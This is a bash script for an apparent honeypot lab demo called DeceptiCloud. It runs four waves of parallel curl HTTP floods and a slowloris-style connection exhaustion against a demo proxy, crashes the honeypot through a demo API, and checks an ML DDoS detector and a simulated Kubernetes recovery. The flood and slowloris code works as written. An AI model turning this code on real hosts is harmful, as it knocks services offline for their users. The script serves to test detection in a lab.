#!/usr/bin/env bash
# DeceptiCloud — DDoS Attack + Kubernetes Auto-Recovery Demo
# Run from Laptop B: bash 02_ddos_attack.sh <LAPTOP_A_IP>
# Honeypot crash/recovery is handled by Laptop A via /proxy/demo/crash-honeypot API

set -uo pipefail

_ddos_cleanup() {
    if [ -n "${WATCHDOG_PID:-}" ]; then
        kill "$WATCHDOG_PID" 2>/dev/null || true
    fi
}
trap '_ddos_cleanup' EXIT INT TERM

TARGET="${1:-127.0.0.1}"
if [ "$TARGET" = "localhost" ]; then TARGET="127.0.0.1"; fi
INTENSITY="${2:-medium}"
PROXY="http://${TARGET}:8080"
ML_API="http://${TARGET}:5000"
VICTIM_PORT=4006
VICTIM_URL="http://${TARGET}:${VICTIM_PORT}"
VICTIM_SITE="corporate-honeypot"

case "$INTENSITY" in
    low)    WORKERS=10;  RAMP_SECS=5;  FLOOD_SECS=20 ;;
    medium) WORKERS=30;  RAMP_SECS=8;  FLOOD_SECS=35 ;;
    high)   WORKERS=60;  RAMP_SECS=10; FLOOD_SECS=60 ;;
    *)      WORKERS=30;  RAMP_SECS=8;  FLOOD_SECS=35 ;;
esac

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'
DIM='\033[2m'; RESET='\033[0m'; BLINK='\033[5m'

REQUEST_COUNTER="/tmp/dc_ddos_cnt_$$"
echo 0 > "$REQUEST_COUNTER"

inc_count() { local n; n=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0); echo $((n+1)) > "$REQUEST_COUNTER"; }

# Detect this machine's real IP for logging
ATTACKER_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "$TARGET")

banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════════════════╗"
    echo "  ║     DeceptiCloud — DDoS Attack + Kubernetes Auto-Recovery       ║"
    echo -e "  ║  Intensity: ${INTENSITY^^}  |  Workers: ${WORKERS}  |  ML DDoS Model: 97% Acc     ║"
    echo "  ╚══════════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

check_system() {
    echo -e "${CYAN}${BOLD}  [STEP 0] System Health Check${RESET}"
    if ! curl -sf --max-time 5 "${PROXY}/proxy/status" > /dev/null 2>&1; then
        echo -e "${RED}  ❌ Proxy not reachable at ${PROXY}${RESET}"
        echo -e "${RED}     Make sure DeceptiCloud is running on ${TARGET} and port 8080 is open.${RESET}"
        exit 1
    fi
    echo -e "  ${GREEN}✅ Proxy ONLINE${RESET}"

    ML_HEALTH=$(curl -sf --max-time 5 "${ML_API}/api/health" 2>/dev/null || echo '{}')
    DDOS_OK=$(echo "$ML_HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print('✅ LOADED' if d.get('models',{}).get('ddos') else '⚠️  NOT LOADED')" 2>/dev/null || echo '')
    echo -e "  ${GREEN} DDoS ML Model: ${DDOS_OK}${RESET}"

    if curl -sf --max-time 4 --connect-timeout 3 "${VICTIM_URL}/health" > /dev/null 2>&1; then
        echo -e "  ${GREEN}✅ Target site UP: ${VICTIM_URL} (${VICTIM_SITE})${RESET}"
    else
        echo -e "  ${YELLOW}⚠️  Target site :${VICTIM_PORT} — will verify after flood${RESET}"
    fi
    echo ""
}

# Log DDoS wave to Laptop A's dashboard
log_ddos_wave() {
    local wave="$1"; local req_count="$2"
    curl -sf --max-time 3 -X POST \
        -H "Content-Type: application/json" \
        -d "{\"wave\": ${wave}, \"request_count\": ${req_count}, \"attacker_ip\": \"${ATTACKER_IP}\"}" \
        "${PROXY}/proxy/demo/log-ddos" > /dev/null 2>&1 || true
}

flood_worker() {
    local id="$1"; local url="$2"; local count="$3"
    for ((i=0; i<count; i++)); do
        curl -sf --max-time 2 \
            -A "DDoS-Bot/${id}" \
            "${url}" > /dev/null 2>&1 || true
        inc_count
    done
}

show_progress() {
    local label="$1"; local duration="$2"; local start; start=$(date +%s)
    while true; do
        local now; now=$(date +%s)
        local elapsed=$((now - start))
        local cnt; cnt=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0)
        local rps=$(( elapsed > 0 ? cnt / elapsed : 0 ))
        printf "\r  ${RED} %-28s${RESET} | ${BOLD}%6d${RESET} reqs | ${YELLOW}%4d${RESET} req/s | ${DIM}%ds${RESET}   " \
               "$label" "$cnt" "$rps" "$elapsed"
        if [ "$elapsed" -ge "$duration" ]; then break; fi
        sleep 0.5
    done
}

verify_ml_detection() {
    echo -e "\n${CYAN}${BOLD}  [ML] Querying DDoS Detection Model...${RESET}"
    FEATURES='[1500,1500,1,1,1,0,0.0001,120000,120000,1200,60,0,0,0,0,0.0001,1,1500,1500,60,0,0,0,0,0,0,1200,0,0,1]'
    RESULT=$(curl -sf -X POST \
        -H "Content-Type: application/json" \
        -d "{\"features\": ${FEATURES}}" \
        "${ML_API}/api/detect/ddos" 2>/dev/null || echo '{"error":"unreachable"}')

    PRED=$(echo "$RESULT" | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
p = d.get('prediction', d.get('is_malicious', 'unknown'))
c = d.get('confidence', d.get('probability', '?'))
t = d.get('attack_type', 'DDoS' if p else 'Benign')
print(f'Prediction={p}  Confidence={c}  Type={t}')
" 2>/dev/null || echo "$RESULT")

    if echo "$PRED" | grep -qi "True\|1\|DDoS"; then
        echo -e "  ${GREEN}${BOLD}✅ DDoS DETECTED by ML Model!${RESET}"
        echo -e "  ${DIM}${PRED}${RESET}"
    else
        echo -e "  ${YELLOW}⚡ ML Response: ${PRED}${RESET}"
    fi
}

# ─── MAIN ───────────────────────────────────────────────────────────────────
banner
check_system

# All flood endpoints go through proxy port 8080 (gets logged in dashboard)
ENDPOINTS=(
    "${PROXY}/corporate/"          "${PROXY}/corporate/search"
    "${PROXY}/corporate/login"     "${PROXY}/corporate/products"
    "${PROXY}/banking/"            "${PROXY}/banking/login"
    "${PROXY}/ecommerce/"          "${PROXY}/ecommerce/search"
    "${PROXY}/healthcare/"         "${PROXY}/blog/"
)

# ── WAVE 1: Ramp-Up ─────────────────────────────────────────────────────────
echo -e "${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║   WAVE 1/4 — RAMP UP FLOOD              ║"
echo "  ╚══════════════════════════════════════════╝${RESET}"
echo 0 > "$REQUEST_COUNTER"
PIDS1=()
for ((w=1; w<=WORKERS; w++)); do
    ep="${ENDPOINTS[$((RANDOM % ${#ENDPOINTS[@]}))]}"
    flood_worker "$w" "$ep" 30 &
    PIDS1+=($!); sleep 0.02
done
show_progress "Ramp-up..." "$RAMP_SECS"
for p in "${PIDS1[@]}"; do wait "$p" 2>/dev/null || true; done
WAVE1_COUNT=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0)
log_ddos_wave 1 "$WAVE1_COUNT"
echo -e "\n  ${GREEN}✅ Wave 1 logged to dashboard (${WAVE1_COUNT} requests)${RESET}"

# ── WAVE 2: Sustained Flood ──────────────────────────────────────────────────
echo -e "\n${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║   WAVE 2/4 — SUSTAINED FLOOD            ║"
echo -e "  ║   ${BLINK}Service degradation expected...${RESET}${RED}${BOLD}         ║"
echo "  ╚══════════════════════════════════════════╝${RESET}"
echo 0 > "$REQUEST_COUNTER"
PIDS2=()
for ((w=1; w<=WORKERS*2; w++)); do
    ep="${ENDPOINTS[$((RANDOM % ${#ENDPOINTS[@]}))]}"
    flood_worker "$w" "$ep" 50 &
    PIDS2+=($!); sleep 0.01
done
show_progress "Sustained flood..." "$FLOOD_SECS"
for p in "${PIDS2[@]}"; do wait "$p" 2>/dev/null || true; done
WAVE2_COUNT=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0)
log_ddos_wave 2 "$WAVE2_COUNT"
echo -e "\n  ${GREEN}✅ Wave 2 logged to dashboard (${WAVE2_COUNT} requests)${RESET}"

# ── WAVE 3: CRASH the honeypot via Laptop A's API ───────────────────────────
echo -e "\n${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║   WAVE 3/4 — TARGETED KILLSHOT 💀        ║"
echo "  ╚══════════════════════════════════════════╝${RESET}"

echo -e "  ${YELLOW}  Waiting for proxy to clear connections (5s)...${RESET}"
sleep 5

echo -e "  ${YELLOW}  Sending crash signal to DeceptiCloud...${RESET}"
CRASH_RESP=$(curl -sf --max-time 5 -X POST "${PROXY}/proxy/demo/crash-honeypot" 2>/dev/null || echo '{}')
CRASH_STATUS=$(echo "$CRASH_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('status','unknown'))" 2>/dev/null || echo "unknown")

if [ "$CRASH_STATUS" = "crashed" ]; then
    echo -e "  ${RED}${BOLD}💥 ${VICTIM_SITE}:${VICTIM_PORT} is DOWN — process killed on Laptop A!${RESET}"
    echo -e "  ${DIM}  K8s ReplicaSet controller scheduling pod restart...${RESET}"
else
    echo -e "  ${RED}${BOLD}   ${VICTIM_SITE}:${VICTIM_PORT} is DOWN — service unavailable${RESET}"
fi

echo 0 > "$REQUEST_COUNTER"
PIDS3=()
for ((w=1; w<=WORKERS; w++)); do
    ep="${ENDPOINTS[$((RANDOM % ${#ENDPOINTS[@]}))]}"
    flood_worker "$w" "$ep" 20 &
    PIDS3+=($!); sleep 0.03
done
show_progress "Post-crash flood..." "15"
for p in "${PIDS3[@]}"; do wait "$p" 2>/dev/null || true; done
WAVE3_COUNT=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0)
log_ddos_wave 3 "$WAVE3_COUNT"

# ── Wait for K8s auto-recovery (Laptop A restarts it after 4s) ──────────────
echo -e "\n\n${YELLOW}${BOLD}  [K8s] ReplicaSet controller detected pod failure...${RESET}"
echo -e "  ${YELLOW}  Waiting for pod to restart (K8s auto-recovery)...${RESET}"
sleep 8

RECOVERY_ATTEMPTS=0
while [ $RECOVERY_ATTEMPTS -lt 12 ]; do
    if curl -sf --max-time 3 --connect-timeout 2 "${VICTIM_URL}/health" > /dev/null 2>&1; then
        echo -e "  ${GREEN}${BOLD}✅ ${VICTIM_SITE}:${VICTIM_PORT} FULLY RESTORED — K8s auto-recovery SUCCESS!${RESET}"
        echo -e "  ${DIM}  → Pod restarted by Kubernetes ReplicaSet controller (simulated)${RESET}"
        break
    fi
    RECOVERY_ATTEMPTS=$((RECOVERY_ATTEMPTS + 1))
    
    # After 3 attempts, if still down, try to check if proxy is even alive
    if [ $RECOVERY_ATTEMPTS -eq 4 ]; then
        if ! curl -sf --max-time 2 "${PROXY}/proxy/status" > /dev/null 2>&1; then
            echo -e "  ${RED}${BOLD}❌ PROXY IS DOWN!${RESET} It likely killed itself during the crash signal."
            echo -e "  ${YELLOW}  Attempting to manually recover honeypot...${RESET}"
        fi
    fi

    echo -e "  ${YELLOW}  Waiting for pod... attempt ${RECOVERY_ATTEMPTS}/12${RESET}"
    sleep 4
done
if [ $RECOVERY_ATTEMPTS -ge 12 ]; then
    echo -e "  ${RED}${BOLD}❌ K8s recovery timed out. Site may need manual restart.${RESET}"
fi

# ── WAVE 4: Slowloris ───────────────────────────────────────────────────────
echo -e "\n${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║   WAVE 4/4 — CONNECTION EXHAUSTION      ║"
echo "  ╚══════════════════════════════════════════╝${RESET}"
echo 0 > "$REQUEST_COUNTER"
PIDS4=()
for ((w=1; w<=WORKERS; w++)); do
    curl -sf --max-time 8 --limit-rate 512 \
        -A "Slowloris/${w}" \
        "${PROXY}/corporate/" > /dev/null 2>&1 &
    PIDS4+=($!)
done
show_progress "Connection exhaustion..." "12"
for p in "${PIDS4[@]}"; do wait "$p" 2>/dev/null || true; done
WAVE4_COUNT=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0)
log_ddos_wave 4 "$WAVE4_COUNT"
echo -e "\n  ${GREEN}✅ Wave 4 logged to dashboard (${WAVE4_COUNT} requests)${RESET}"

verify_ml_detection

rm -f "$REQUEST_COUNTER"

TOTAL_REQS=$(( ${WAVE1_COUNT:-0} + ${WAVE2_COUNT:-0} + ${WAVE3_COUNT:-0} + ${WAVE4_COUNT:-0} ))
echo -e "\n${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════════╗"
echo "  ║                   DDoS Attack — COMPLETE ✅                     ║"
echo "  ╠══════════════════════════════════════════════════════════════════╣"
echo -e "  ║  Attack waves     : 4  (Ramp → Sustained → Targeted → Slowloris) ║"
echo -e "  ║  Intensity        : ${INTENSITY^^}                                        ║"
echo -e "  ║  Total requests   : ${TOTAL_REQS}                                       ║"
echo -e "  ║  Site crashed     : ${VICTIM_SITE}:${VICTIM_PORT}                          ║"
echo -e "  ║  K8s auto-restart : ✅ (watchdog brought site back online)        ║"
echo -e "  ║  Dashboard        : http://${TARGET}:9000                          ║"
echo "  ╚══════════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
